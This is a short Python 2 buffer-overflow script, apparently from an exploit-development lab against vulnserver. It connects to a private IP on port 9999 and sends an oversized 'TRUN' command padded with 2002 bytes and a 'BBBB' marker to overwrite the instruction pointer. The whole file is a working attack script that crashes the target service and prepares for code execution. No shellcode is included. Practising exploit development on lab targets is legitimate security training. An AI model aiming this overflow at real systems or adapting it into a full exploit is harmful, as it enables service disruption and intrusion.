#!/usr/bin/python

import socket, sys
from time import sleep

padding = "A" * 2002
EIP = "BBBB"
offset = "C"*50

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	s.connect(('192.168.100.29',9999))
	s.recv(1024)

	print '[*] Senf buffer Lenght: ' + str(len(padding))
	s.send("TRUN /.:/ " + padding + EIP + offset)
	s.close()
	sleep(1)

except Exception as e:
	print(str(e))
	sys.exit()
